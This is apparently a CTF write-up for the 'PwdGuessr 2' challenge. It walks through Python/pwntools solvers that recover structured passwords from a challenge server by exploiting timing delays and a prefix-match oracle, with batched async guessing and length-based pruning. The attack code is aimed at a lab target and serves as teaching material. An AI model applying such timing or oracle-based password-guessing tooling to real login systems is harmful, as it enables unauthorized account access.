# PwdGuessr 2

An interesting password guessing challenge

## Challenge Description

> To guess at things randomly is not to guess at all. Only through being methodical can enlightenment be achieved

You round a bend in the road, and your party is set upon by bandits - an ambush!
Fortunately, you've been praciticing your martial arts, and you take the opportunity to show off your latest moves.
You kca-spank your way to a comprehensive victory, sending the bandits packing. As they run, one of them drops the device they use to coodinate their activities.
If you can recover the credentials of enough bandits, you can make sure to avoid their attentions for the foreseeable future.

`nc $target_dns $target_port`


```python
def check_pwd(sample, pwd):
    for s, p in zip_longest(sample, pwd):
        if s is None or p is None:
            return False
        if p != s:
            time.sleep(0.5)  # Add a delay to stop password-guessing attacks
            return False
    return True
```

`nc $target_dns $target_port`

## Play Along at Home

During the CTF, the challenge was hosted at `pwdguessr22222.chal.cybears.io:2323`

To play after the CTF, run
```bash
docker run --name pwdguessr2 -dp 2323:2323 --rm registry.gitlab.com/cybears/fall-of-cybeartron/misc-pwdguessr2
```
and then change the host in the scripts to `127.0.0.1`

## Walkthrough

### Recap

Last challenge we discovered that the passwords were chosen by concatenating four pieces of information:

1. A day of the week
2. A movie from Harry Potter or the Nine Starwars Movies
3. An element of the Periodic Table
4. A nato phonetic alphabet letter

This means there are `7 * 19 * 120 * 26 = 414960` possible passwords

### Discovery

This challenge was primarily an optimisation challenge, so largely was based off the original source with multiple refactors

Connecting to the challenge with `nc pwdguessr22222.chal.cybears.io 2323` gave the following banner:
```
You need to prove your efficiency at password guessing.
Send a single natural number to get that many IDs, each representing a password to guess.
Send a comma separated list of ID:guess (up to 20 at a time) to get back a comma separated list of results.

You still need to recover 200 passwords. You have 6000 incorrect guesses remaining.
```
Which gives two useful bits of information

1. If we wish to speed up out attempts, we can make up to 20 guesses at a time
2. We need to guess 200 passwords with 6000 incorrect guesses, meaning we must average less than 30 incorrect guesses per user

In the connection, sending a number gives user IDs which are UUIDs, which could then be used to guess

For this challenge, rather than delaying the output for incorrect passwords, it returned either `_` for partially
correct, `1` for fully correct, and `0` for incorrect. This made it much faster.

### Theorising

At first, I was uncertain whether there was a correlation between each segment of the password so I made a script to
bulk solve challenge 1 and record the results in a CSV.

To do this, I refactored my guesser into a class `Guesser`
```python
class Guesser:
    def __init__(self, host=HOST, port=PORT):
        self.r = remote(host, port)
        self.host = host
        self.port = port
        user_line = self.r.recvline().decode()
        self.user = user_line.split(" ")[-1][:-2]
        self.r.recvuntil("Please enter your password: ")
        self.password = None
        self.guesses = 0
        self.incorrect = 0

    def check(self, password):
        log.debug(f"Checking: {password}")
        self.guesses += 1
        before = time.time()
        self.r.sendline(password)
        out = self.r.recv(5)
        if out != b"Sorry":
            if out == b"Conne":
                raise Timeout
            self.password = password
            raise SuccessfulConnection(out.decode())
        after = time.time()
        self.r.recvuntil("Please enter your password: ")
        delta = after - before
        if delta < 0.5:
            self.password = password
            return True
        self.incorrect += 1
        return False

    def brute_force(self, password: str = ""):
        log.warning(f"Brute forcing from: {password}")
        while True:
            for c in tqdm(ALPHABET):
                if self.check(password + c):
                    password += c
                    log.debug(f"Partial: {password}")
                    break
            else:
                raise NotFound("Brute")

    def guess_words(self, words, password: str = "", fallback=True):
        for word in words:
            test = password + word
            if self.check(test):
                return test
        else:
            if fallback:
                log.warn(f"Failed to use password from {words}")
                log.warn("Falling back to bruteforce")
                return self.brute_force(password)
            else:
                return None

    def guess_words_smart(self, words, password: str = ""):
        # Napkin maths says 4 is a good number
        if len(words) < 4:
            return self.guess_words(words, password)
        first_letters = Counter(word[0] for word in words).most_common()
        if first_letters[0][1] == 1:
            return self.guess_words(words, password)
        first_letters_s = [letter for letter, cnt in first_letters if cnt > 1]
        new_s = self.guess_words(first_letters_s, password, fallback=False)
        if new_s is None:
            new_words = [word for word in words if word[0] not in first_letters_s]
            assert len(new_words) > 0
            return self.guess_words_smart(new_words, password)
        words = [word[1:] for word in words if word[0] == new_s[-1]]
        return self.guess_words_smart(words, new_s)

    def solve(self):
        try:
            password = self.guess_words_smart(days)
            log.info(f"Partial: {password!r}")
            password = self.guess_words_smart(movies, password)
            log.info(f"Partial: {password!r}")
            password = self.guess_words_smart(elements, password)
            log.info(f"Partial: {password!r}")
            password = self.guess_words_smart(nato_phonetic, password)
            log.info(f"Partial: {password!r}")
            log.warning("Something after phonetic alphabet, resorting to brute force")
            self.brute_force(password)
        except SuccessfulConnection as e:
            log.info("We're in!")
            out = self.r.recvall(0.1)
            msg = e.args[0] + out.decode()
            log.info(f"Guesses: {self.guesses}")
            log.info(f"User: {self.user}")
            log.info(f"Password: {self.password}")
            log.info(f"MSG: {msg}")
            return True, self.guesses, self.password, self.user, self.incorrect
        except (Timeout, EOFError, AssertionError):
            return False, self.guesses, self.password, self.user, self.incorrect
        except Exception as e:
            log.exception(e)
            return False, self.guesses, self.password, self.user, self.incorrect
        finally:
            self.r.close()
```

And wrote a bulk guesser script

```python
import multiprocessing
from guesser import Guesser
from pwn import *

PARALLELISM = 50
SAMPLES = 200

def run_guess(idx):
    log.info(f"Starting {idx}")
    try:
        guesser = Guesser()
        return guesser.solve()
    except:
        return None

def main():
    with multiprocessing.Pool(PARALLELISM) as p:
        results = p.map(run_guess, range(SAMPLES))
    res_string = "\n".join(
        ",".join(str(x) for x in res) for res in results if res is not None
    )
    print(res_string)
    with open("results.csv", "a+") as f:
        f.write(res_string + "\n")

if __name__ == "__main__":
    main()
```

At this point, I discovered the various typos in my elements and nato alphabet (Removed a -)

It appeared from looking at the data that was no correlation between the sections

However this did also show that on average it was taking ~26.7 incorrected guesses per password which was within parameters.

### Solver

I adapted the guesser to handle the user IDs which gave me, but just did one ID at a time
```python
from pwn import *
from tqdm import tqdm
from collections import Counter
from pwdguessrlists import (
    elements,
    movies,
    days,
    nato_phonetic,
)

HOST = "pwdguessr22222.chal.cybears.io"
PORT = 2323
ALPHABET = string.ascii_lowercase


class SuccessfulConnection(Exception):
    pass


class NotFound(Exception):
    pass


class Timeout(Exception):
    pass


class GuesserSecondary:
    def __init__(self, r):
        self.r = r
        self.r.sendline("1")
        self.user = self.r.recvline().decode().strip()
        log.debug(f"user={self.user!r}")
        self.r.recvline()
        self.password = ""
        self.guesses = 0

    def check(self, password):
        log.debug(f"Check: {password}")
        self.guesses += 1
        self.r.sendline(f"{self.user}:{password}")
        out = self.r.recvline().decode()
        self.r.recvline()
        if out[0] == "0":
            return False
        if out[0] == "_":
            self.password = password
            return True
        if out[0] == "1":
            self.password = password
            raise SuccessfulConnection
        raise ValueError(f"Invalid Out: {out!r}")

    def brute_force(self, password: str = ""):
        log.error(f"Brute forcing from: {password}")
        while True:
            for c in tqdm(ALPHABET):
                if self.check(password + c):
                    password += c
                    log.debug(f"Partial: {password}")
                    break
            else:
                raise NotFound("Brute")

    def guess_words(self, words, password: str = "", fallback=True):
        for word in words:
            test = password + word
            if self.check(test):
                return test
        else:
            if fallback:
                log.warn(f"Failed to use password from {words}")
                log.warn("Falling back to bruteforce")
                return self.brute_force(password)
            else:
                return None

    def guess_words_smart(self, words, password: str = ""):
        # Napkin maths says 4 is a good number
        if len(words) < 4:
            return self.guess_words(words, password)
        first_letters = Counter(word[0] for word in words).most_common()
        if first_letters[0][1] == 1:
            return self.guess_words(words, password)
        first_letters_s = [letter for letter, cnt in first_letters if cnt > 1]
        new_s = self.guess_words(first_letters_s, password, fallback=False)
        if new_s is None:
            new_words = [word for word in words if word[0] not in first_letters_s]
            assert len(new_words) > 0
            return self.guess_words_smart(new_words, password)
        words = [word[1:] for word in words if word[0] == new_s[-1]]
        return self.guess_words_smart(words, new_s)

    def solve(self):
        try:
            password = self.guess_words_smart(days)
            log.debug(f"Partial: {password!r}")
            password = self.guess_words_smart(movies, password)
            log.debug(f"Partial: {password!r}")
            password = self.guess_words_smart(elements, password)
            log.debug(f"Partial: {password!r}")
            password = self.guess_words_smart(nato_phonetic, password)
            log.debug(f"Partial: {password!r}")
            log.error("Something after phonetic alphabet, resorting to brute force")
            self.brute_force(password)
        except SuccessfulConnection:
            log.info("We're in!")
            out = self.r.recvuntil("remaining.\n", timeout=1)
            log.info(f"MSG: {out}")
            log.info(f"Guesses: {self.guesses}/6000 ({round(self.guesses / 60, 2)})")
            log.info(f"User: {self.user}")
            log.info(f"Password: {self.password}")
            return True, self.guesses, self.password, self.user
        # except Timeout:
        #     return False, self.guesses, self.password, self.user


def main():
    log.setLevel("INFO")
    r = remote(HOST, PORT)
    r.recvuntil("remaining.\n")
    for i in tqdm(range(201)):
        guesser = GuesserSecondary(r)
        guesser.solve()


if __name__ == "__main__":
    main()
```

### Betrayal

Running the script took 15 minutes, but after it reached 200, it didn't appear to exit like I'd expected.

Conveniently I had been running Wireshark in the background so I saw what had occurred

I'd received a "flag" of
```
did_you_really_think_cybears{would_make_it_this_easy}?
```

Followed by a banner like the original, but with an extra line at the end
```
You need to prove even more efficiency at password guessing.
Send a single natural number to get that many IDs, each representing a password to guess.
Send a comma separated list of ID:guess (up to {} at a time) to get back a comma separated list of results.

This time, you're given the length of each password alongside its ID.
```

This meant that I had to repeat the 200 password part (which took 15) mins and then repeat, but this time using the
known length of each password to reduce the incorrect attempts.

### Optimisation - Concurrency

As waiting > 15 mins per attempt was impractical, (and I was still hopeful for first solve) I decided to bite the bullet
and rewrite the guesser to guess 20 users at a time, with comma separated `uid:password` pairs.


#### Dataloader

The approach I took for writing this is inspired by https://github.com/graphql/dataloader in that a dataloader receives
requests, and batches the requests once a condition is reached.

This was the first time I've ever really had to use Future's in Python, but as they are similar to Promise's in
javascript, the learning curve was fine.

```python
class Loader:
    def __init__(self, r: remote):
        self.r = r
        self.total_guessers = 0
        self.incorrect_guesses = 0
        self.guessers = 0
        self.futures = []

    def add_guesser(self):
        self.guessers += 1
        self.total_guessers += 1

    def remove_guesser(self):
        self.guessers -= 1
        if len(self.futures) == self.guessers and self.guessers > 0:
            self.resolve_batch()

    def submit(self, user: str, password: str, future: asyncio.Future):
        self.futures.append((user, password, future))
        if len(self.futures) == self.guessers:
            self.resolve_batch()

    def resolve_batch(self):
        futures = self.futures
        self.futures = []
        self.r.recvline(timeout=0.1)
        query = ",".join(f"{user}:{password}" for (user, password, future) in futures)
        self.r.sendline(query)
        result = self.r.recvline().decode().strip()
        results = result.split(",")
        log.debug(f"Results: {results!r}")
        for resp, (user, password, future) in zip(results, futures):
            log.debug(f"Resolved: ({user=},{password=}) => {resp}")
            if resp == "0":
                self.incorrect_guesses += 1
                future.set_result(False)
            elif resp == "_":
                future.set_result(True)
            elif resp == "1":
                future.set_exception(SuccessfulConnection(password))
```

This let me rewrite the `check` function to use promises, and added many `async` and `awaits` through the guesser class.

```python
class GuesserAsync:
    def __init__(self, loader: Loader, user: str):
        self.loader = loader
        self.user = user
        log.debug(f"Init: user={user!r}")
        self.guesses = 0
        self.loader.add_guesser()

    async def check(self, password):
        log.debug(f"Check: {password}")
        loop = asyncio.get_running_loop()
        future = loop.create_future()
        self.loader.submit(self.user, password, future)
        return await future

    async def guess_words(self, words, password: str = ""):
        for word in words:
            test = password + word
            if await self.check(test):
                return test
        else:
            return None

    async def guess_words_smart(self, words, password: str = ""):
        # log.debug(f"Partial: {self.password!r}")
        # Napkin maths says 4 is a good number
        if len(words) < 3:
            return await self.guess_words(words, password)
        first_letters = Counter(word[0] for word in words).most_common()
        if first_letters[0][1] == 1:
            return await self.guess_words(words, password)
        first_letters_s = [letter for letter, cnt in first_letters if cnt > 1]
        new_s = await self.guess_words(first_letters_s, password)
        if new_s is None:
            new_words = [word for word in words if word[0] not in first_letters_s]
            assert len(new_words) > 0
            return await self.guess_words_smart(new_words, password)
        words = [word[1:] for word in words if word[0] == new_s[-1]]
        return await self.guess_words_smart(words, new_s)

    async def solve(self):
        try:
            password = await self.guess_words_smart(days)
            password = await self.guess_words_smart(movies, password)
            password = await self.guess_words_smart(elements, password)
            await self.guess_words_smart(nato_phonetic, password)
            log.error("Something after phonetic alphabet")
            raise ValueError
        except SuccessfulConnection as e:
            log.debug(f"User: {self.user}")
            log.debug(f"Password: {e.args[0]}")
            self.loader.remove_guesser()
            return True, self.guesses, e.args[0], self.user
```

And called it with
```python
async def main():
    log.setLevel("INFO")
    r = remote(HOST, PORT)
    r.recvuntil("remaining.\n")
    loader = Loader(r)
    for i in tqdm(range(0, 400, CONCURRENCY)):
        if i == 200:
            loader.total_guessers = 0
            loader.incorrect_guesses = 0
        log.debug(r.recvuntil("remaining.\n", timeout=0.5).decode())
        r.sendline(str(CONCURRENCY))
        users = r.recvline(keepends=False).decode().split(",")
        log.debug(r.recvline(keepends=False).decode())
        guessers = [GuesserAsync(loader, user) for user in users]
        await asyncio.gather(*[guesser.solve() for guesser in guessers])
        avg_mistakes = round(loader.incorrect_guesses / loader.total_guessers, 2)
        log.info(f"Total Mistakes: {loader.incorrect_guesses}")
        log.info(f"Avg Mistakes: {avg_mistakes}")
    print(r.recvall(timeout=2))
```

This optimisation meant that it took ~1 min for 200 passwords, compared to 15 minutes.

### Optimisation - Benchmarking

At this point, I needed a good way of testing the optimisations quickly to enable fast iteration on design.

Thankfully the async rewrite had decoupled the network connectivity and the Guesser class which meant I could create a
mock dataloader to serve previous passwords and benchmark the design quickly.

I wrote an alternative dataloader and main which read the CSV acquired from the theorising step that looked like

```python
def check_pwd(sample, pwd):
    for s, p in zip_longest(sample, pwd):
        if s is None or p is None:
            return "_"
        if p != s:
            return "0"
    return "1"

class FakeLoader(Loader):
    def __init__(self, r: remote, user_data: Dict[str, str]):
        super().__init__(r)
        self.user_data = user_data

    def add_guesser(self):
        super(FakeLoader, self).add_guesser()

    def resolve_batch(self):
        futures = self.futures
        self.futures = []
        for user, password, future in futures:
            sample = self.user_data[user]
            resp = check_pwd(sample, password)
            log.debug(f"Resolved: ({user=},{password=}) => {resp}")
            if resp == "0":
                self.incorrect_guesses += 1
                future.set_result(False)
            elif resp == "_":
                future.set_result(True)
            elif resp == "1":
                future.set_exception(SuccessfulConnection(password))
```

```python
async def fake_main():
    log.setLevel("INFO")
    with open("results.csv") as f:
        reader = csv.reader(f)
        passwords = [row[2] for row in reader if row[0] == "True"]
    user_data = {str(uuid4()): password for password in passwords}

    loader = FakeLoader(None, user_data)
    for user, password in tqdm(user_data.items()):
        guesser = GuesserAsync(loader, f"{user}:{len(password)}")
        await guesser.solve()
    avg_mistakes = round(loader.incorrect_guesses / loader.total_guessers, 2)
    log.info(f"Total Mistakes: {loader.incorrect_guesses}")
    log.info(f"Avg Mistakes: {avg_mistakes}")
```

This meant that I could test against 200 passwords in less than a second

### Optimisation - Length Based Filtering

Modifying the `GuesserAsync` to support optional max length was as simple as changing the `__init__`

```python
    def __init__(self, loader: Loader, user: str):
        self.loader = loader
        if ":" in user:
            self.user, max_len = user.split(":")
            self.max_len = int(max_len)
        else:
            self.user = user
            self.max_len = None
        log.debug(f"Init: user={user!r}")
        self.guesses = 0
        self.loader.add_guesser()
```
I then made changes to `guess_words_smart`, to use the `max_len` to filter what words and letters were attempted, and in what order.

To do this, I added an optional arg `round` that specified what round of words it was in, so different optimisations
could be used for each wordlist.

I made two optimisations which brought the average mistakes below 15.

#### Nato Phonetic (Round 4)

When guessing the Nato Phonetic alphabet, I filtered the words to only include words which would lead to a string of the target length

This brought the avg mistakes from 26.3 => 16.3.

#### Elements (Round 3)

When checking elements, I changed the sorting of the first letters to count the combinations of element+nato_letter
which had a password of target length.

This brought the avg mistakes from 16.3 => 14.7 which was under the required count.

#### Source

This meant the `guess_words_smart` function looked like
```python
    async def guess_words_smart(self, words, password: str = "", round=None):
        # log.debug(f"Partial: {self.password!r}")
        # Napkin maths says 4 is a good number
        if len(words) < 3:
            return await self.guess_words(words, password)
        first_letters = Counter(word[0] for word in words).most_common()

        # Length based optimizations
        if self.max_len is not None:
            current = len(password)
            delta = self.max_len - current
            if round == 3:
                pass
                first_letters = Counter(
                    word[0]
                    for word, next_word in product(words, nato_phonetic)
                    if len(word + next_word) == delta
                ).most_common()
            elif round == 4:
                words = [word for word in words if len(word) == delta]

        if first_letters[0][1] == 1:
            return await self.guess_words(words, password)
        first_letters_s = [letter for letter, cnt in first_letters if cnt > 1]
        new_s = await self.guess_words(first_letters_s, password)
        if new_s is None:
            new_words = [word for word in words if word[0] not in first_letters_s]
            assert len(new_words) > 0
            return await self.guess_words_smart(new_words, password, round=round)
        words = [word[1:] for word in words if word[0] == new_s[-1]]
        return await self.guess_words_smart(words, new_s, round=round)
```

### Success

With these optimisations, I ran the script, the first time it ran out of guesses with one password remaining and at the
nato alphabet round, so given how close it was, I just ran it again, which got me the flag.

## Source Code

This used the same `pwdguessrlists.py` as [PwdGuessr1](pwdguessr1.md)

**guesserv3.py**
```python
import csv
from itertools import zip_longest, product
from typing import Dict

from pwn import *
from tqdm import tqdm
import asyncio
from uuid import uuid4
from collections import Counter
from pwdguessrlists import (
    elements,
    movies,
    days,
    nato_phonetic,
)

# HOST = "pwdguessr22222.chal.cybears.io"
HOST = "127.0.0.1"
PORT = 2323
CONCURRENCY = 20


class SuccessfulConnection(Exception):
    pass


class NotFound(Exception):
    pass


class Timeout(Exception):
    pass


class Loader:
    def __init__(self, r: remote):
        self.r = r
        self.total_guessers = 0
        self.incorrect_guesses = 0
        self.guessers = 0
        self.futures = []

    def add_guesser(self):
        self.guessers += 1
        self.total_guessers += 1

    def remove_guesser(self):
        self.guessers -= 1
        if len(self.futures) == self.guessers and self.guessers > 0:
            self.resolve_batch()

    def submit(self, user: str, password: str, future: asyncio.Future):
        self.futures.append((user, password, future))
        if len(self.futures) == self.guessers:
            self.resolve_batch()

    def resolve_batch(self):
        futures = self.futures
        self.futures = []
        self.r.recvline(timeout=0.1)
        query = ",".join(f"{user}:{password}" for (user, password, future) in futures)
        self.r.sendline(query)
        result = self.r.recvline().decode().strip()
        results = result.split(",")
        log.debug(f"Results: {results!r}")
        for resp, (user, password, future) in zip(results, futures):
            log.debug(f"Resolved: ({user=},{password=}) => {resp}")
            if resp == "0":
                self.incorrect_guesses += 1
                future.set_result(False)
            elif resp == "_":
                future.set_result(True)
            elif resp == "1":
                future.set_exception(SuccessfulConnection(password))


def check_pwd(sample, pwd):
    for s, p in zip_longest(sample, pwd):
        if s is None or p is None:
            return "_"
        if p != s:
            return "0"
    return "1"


class FakeLoader(Loader):
    def __init__(self, r: remote, user_data: Dict[str, str]):
        super().__init__(r)
        self.user_data = user_data

    def add_guesser(self):
        super(FakeLoader, self).add_guesser()

    def resolve_batch(self):
        futures = self.futures
        self.futures = []
        for user, password, future in futures:
            sample = self.user_data[user]
            resp = check_pwd(sample, password)
            log.debug(f"Resolved: ({user=},{password=}) => {resp}")
            if resp == "0":
                self.incorrect_guesses += 1
                future.set_result(False)
            elif resp == "_":
                future.set_result(True)
            elif resp == "1":
                future.set_exception(SuccessfulConnection(password))


class GuesserAsync:
    def __init__(self, loader: Loader, user: str):
        self.loader = loader
        if ":" in user:
            self.user, max_len = user.split(":")
            self.max_len = int(max_len)
        else:
            self.user = user
            self.max_len = None
        log.debug(f"Init: user={user!r}")
        self.guesses = 0
        self.loader.add_guesser()

    async def check(self, password):
        log.debug(f"Check: {password}")
        loop = asyncio.get_running_loop()
        future = loop.create_future()
        self.loader.submit(self.user, password, future)
        return await future

    async def guess_words(self, words, password: str = ""):
        for word in words:
            test = password + word
            if await self.check(test):
                return test
        else:
            return None

    async def guess_words_smart(self, words, password: str = "", round=None):
        if len(words) < 3:
            return await self.guess_words(words, password)
        first_letters = Counter(word[0] for word in words).most_common()

        # Silly optimizations
        if self.max_len is not None:
            current = len(password)
            delta = self.max_len - current
            if round == 3:
                pass
                first_letters = Counter(
                    word[0]
                    for word, next_word in product(words, nato_phonetic)
                    if len(word + next_word) == delta
                ).most_common()
            elif round == 4:
                words = [word for word in words if len(word) == delta]

        if first_letters[0][1] == 1:
            return await self.guess_words(words, password)
        first_letters_s = [letter for letter, cnt in first_letters if cnt > 1]
        new_s = await self.guess_words(first_letters_s, password)
        if new_s is None:
            new_words = [word for word in words if word[0] not in first_letters_s]
            assert len(new_words) > 0
            return await self.guess_words_smart(new_words, password, round=round)
        words = [word[1:] for word in words if word[0] == new_s[-1]]
        return await self.guess_words_smart(words, new_s, round=round)

    async def solve(self):
        try:
            password = await self.guess_words_smart(days)
            password = await self.guess_words_smart(movies, password)
            password = await self.guess_words_smart(elements, password, round=3)
            await self.guess_words_smart(nato_phonetic, password, round=4)
            log.error("Something after phonetic alphabet")
            raise ValueError
        except SuccessfulConnection as e:
            log.debug(f"User: {self.user}")
            log.debug(f"Password: {e.args[0]}")
            self.loader.remove_guesser()
            return True, self.guesses, e.args[0], self.user


async def main():
    log.setLevel("INFO")
    r = remote(HOST, PORT)
    r.recvuntil("remaining.\n")
    loader = Loader(r)
    for i in tqdm(range(0, 400, CONCURRENCY)):
        if i == 200:
            loader.total_guessers = 0
            loader.incorrect_guesses = 0
        log.debug(r.recvuntil("remaining.\n", timeout=0.5).decode())
        r.sendline(str(CONCURRENCY))
        users = r.recvline(keepends=False).decode().split(",")
        log.debug(r.recvline(keepends=False).decode())
        guessers = [GuesserAsync(loader, user) for user in users]
        await asyncio.gather(*[guesser.solve() for guesser in guessers])
        avg_mistakes = round(loader.incorrect_guesses / loader.total_guessers, 2)
        log.info(f"Total Mistakes: {loader.incorrect_guesses}")
        log.info(f"Avg Mistakes: {avg_mistakes}")
    print(r.recvall(timeout=2))


async def fake_main():
    log.setLevel("INFO")
    with open("results.csv") as f:
        reader = csv.reader(f)
        passwords = [row[2] for row in reader if row[0] == "True"]
    user_data = {str(uuid4()): password for password in passwords}

    loader = FakeLoader(None, user_data)
    for user, password in tqdm(user_data.items()):
        guesser = GuesserAsync(loader, f"{user}:{len(password)}")
        await guesser.solve()
    avg_mistakes = round(loader.incorrect_guesses / loader.total_guessers, 2)
    log.info(f"Total Mistakes: {loader.incorrect_guesses}")
    log.info(f"Avg Mistakes: {avg_mistakes}")


if __name__ == "__main__":
    asyncio.run(main())
    # asyncio.run(fake_main())
```
